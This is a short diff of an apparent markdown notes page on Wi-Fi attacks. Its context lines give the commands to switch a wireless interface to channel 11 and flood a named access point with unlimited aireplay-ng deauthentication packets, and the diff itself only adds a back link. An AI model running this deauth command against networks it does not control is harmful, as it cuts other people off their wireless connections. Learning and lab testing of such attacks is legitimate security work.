@@ -52,3 +52,5 @@ You can also use AngryIPScanner
 1. Switch channel `sudo iwconfig wlan0 channel 11`
 2. Send Deauth packets `sudo aireplay-ng -0 0 -a E8:9F:80:12:5C:77 wlan0`
 > This will continuasly block the packets using the '0' argument but we can set a timer for how many packets are being sent.
+
+[Back](./)
